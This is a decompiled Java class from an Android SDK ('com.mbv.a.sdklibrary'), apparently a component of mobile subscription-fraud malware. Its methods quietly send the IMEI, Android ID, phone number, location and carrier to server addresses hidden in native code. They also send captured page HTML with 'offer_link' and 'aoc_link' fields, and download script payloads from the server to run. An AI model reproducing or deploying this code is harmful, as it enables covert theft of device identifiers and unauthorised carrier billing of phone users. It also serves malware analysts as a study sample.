package com.mbv.a.sdklibrary.manager;

import android.support.v4.app.NotificationCompat;
import android.util.Base64;
import com.google.gson.d;
import com.mbv.a.sdklibrary.b.e;
import com.mbv.a.sdklibrary.b.f;
import com.mbv.a.sdklibrary.entity.JsData;
import com.mbv.a.sdklibrary.net.AsyncHttpPost;
import java.util.ArrayList;
import java.util.HashMap;

/* compiled from: DataManager.java */
/* loaded from: classes.dex */
public class a implements com.mbv.a.sdklibrary.service.a {

    /* renamed from: a  reason: collision with root package name */
    private com.mbv.a.sdklibrary.a.a f699a;

    public static a a() {
        return C0040a.f705a;
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* compiled from: DataManager.java */
    /* renamed from: com.mbv.a.sdklibrary.manager.a$a  reason: collision with other inner class name */
    /* loaded from: classes.dex */
    public static class C0040a {

        /* renamed from: a  reason: collision with root package name */
        private static final a f705a = new a();
    }

    public void a(com.mbv.a.sdklibrary.c.a aVar) {
        this.f699a = aVar.getPresenter();
    }

    @Override // com.mbv.a.sdklibrary.service.a
    public void a(String str, String str2, String str3) {
        HashMap hashMap = new HashMap();
        try {
            hashMap.put("apk_name", f.g());
            hashMap.put("imei", f.c());
            hashMap.put("android_id", f.e());
            hashMap.put("phone", f.o());
            hashMap.put("package", f.f());
            hashMap.put("clickid", com.mbv.a.sdklibrary.b.a.a());
            hashMap.put("time", (System.currentTimeMillis() / 1000) + "");
            hashMap.put("time_millis", System.currentTimeMillis() + "");
            hashMap.put("offer_link", str);
            hashMap.put("aoc_link", str2);
            hashMap.put("html", Base64.encodeToString(str3.getBytes(), 0));
            hashMap.put("sdk_version", "1.6");
        } catch (Exception e) {
            e.printStackTrace();
        }
        AsyncHttpPost.post(JniManager.nativeRepo(), hashMap, new com.mbv.a.sdklibrary.net.b() { // from class: com.mbv.a.sdklibrary.manager.a.1
            @Override // com.mbv.a.sdklibrary.net.b
            public void a(Exception exc, byte[] bArr) {
                if (exc != null) {
                    exc.printStackTrace();
                }
            }
        });
    }

    @Override // com.mbv.a.sdklibrary.service.a
    public void a(String str, String str2, int i) {
        HashMap hashMap = new HashMap();
        try {
            hashMap.put("apk_name", f.g());
            hashMap.put("imei", f.c());
            hashMap.put("android_id", f.e());
            hashMap.put("phone", f.o());
            hashMap.put("package", f.f());
            hashMap.put("clickid", com.mbv.a.sdklibrary.b.a.a());
            hashMap.put("time", (System.currentTimeMillis() / 1000) + "");
            hashMap.put("time_millis", System.currentTimeMillis() + "");
            hashMap.put("offer_link", str);
            hashMap.put("aoc_link", str2);
            hashMap.put(NotificationCompat.CATEGORY_STATUS, i + "");
            hashMap.put("sdk_version", "1.6");
        } catch (Exception e) {
            e.printStackTrace();
        }
        AsyncHttpPost.post(JniManager.nativeUrls(), hashMap, new com.mbv.a.sdklibrary.net.b() { // from class: com.mbv.a.sdklibrary.manager.a.2
            @Override // com.mbv.a.sdklibrary.net.b
            public void a(Exception exc, byte[] bArr) {
                if (exc != null) {
                    exc.printStackTrace();
                }
            }
        });
    }

    public void b() {
        HashMap hashMap = new HashMap();
        try {
            hashMap.put("apk_name", f.g());
            hashMap.put("imei", f.c());
            hashMap.put("android_id", f.e());
            hashMap.put("phone", f.o());
            hashMap.put("package", f.f());
            hashMap.put("clickid", com.mbv.a.sdklibrary.b.a.a());
            hashMap.put("time", (System.currentTimeMillis() / 1000) + "");
            hashMap.put("time_millis", System.currentTimeMillis() + "");
            hashMap.put("sdk_version", "1.6");
        } catch (Exception e) {
            e.printStackTrace();
        }
        AsyncHttpPost.post(JniManager.nativeOffe(), hashMap, new com.mbv.a.sdklibrary.net.b() { // from class: com.mbv.a.sdklibrary.manager.a.3
            @Override // com.mbv.a.sdklibrary.net.b
            public void a(Exception exc, byte[] bArr) {
                if (exc != null) {
                    exc.printStackTrace();
                    return;
                }
                try {
                    String b = e.b(new String(bArr));
                    a.this.f699a.a((ArrayList) new d().a(b, new com.google.gson.b.a<ArrayList<JsData>>() { // from class: com.mbv.a.sdklibrary.manager.a.3.1
                    }.b()));
                    com.mbv.a.sdklibrary.b.a().c();
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
        });
    }

    public void c() {
        HashMap hashMap = new HashMap();
        try {
            hashMap.put("apk_name", f.g());
            hashMap.put("imei", f.c());
            hashMap.put("android_id", f.e());
            hashMap.put("phone", f.o());
            hashMap.put("package", f.f());
            hashMap.put("GEO", f.p());
            hashMap.put("Telco", f.r());
            hashMap.put("time", (System.currentTimeMillis() / 1000) + "");
            hashMap.put("sdk_version", "1.6");
        } catch (Exception e) {
            e.printStackTrace();
        }
        AsyncHttpPost.post(JniManager.nativeCallback(), hashMap, new com.mbv.a.sdklibrary.net.b() { // from class: com.mbv.a.sdklibrary.manager.a.4
            @Override // com.mbv.a.sdklibrary.net.b
            public void a(Exception exc, byte[] bArr) {
                if (exc != null) {
                    exc.printStackTrace();
                }
            }
        });
    }

    public void a(int i) {
        HashMap hashMap = new HashMap();
        try {
            hashMap.put("apk_name", f.g());
            hashMap.put("imei", f.c());
            hashMap.put("android_id", f.e());
            hashMap.put("phone", f.o());
            hashMap.put("package", f.f());
            hashMap.put("clickid", com.mbv.a.sdklibrary.b.a.a());
            hashMap.put("time", (System.currentTimeMillis() / 1000) + "");
            hashMap.put("time_millis", System.currentTimeMillis() + "");
            hashMap.put("sdk_version", "1.6");
            hashMap.put(NotificationCompat.CATEGORY_STATUS, i + "");
        } catch (Exception e) {
            e.printStackTrace();
        }
        AsyncHttpPost.post(JniManager.nativeDxs(), hashMap, new com.mbv.a.sdklibrary.net.b() { // from class: com.mbv.a.sdklibrary.manager.a.5
            @Override // com.mbv.a.sdklibrary.net.b
            public void a(Exception exc, byte[] bArr) {
                if (exc != null) {
                    exc.printStackTrace();
                }
            }
        });
    }
}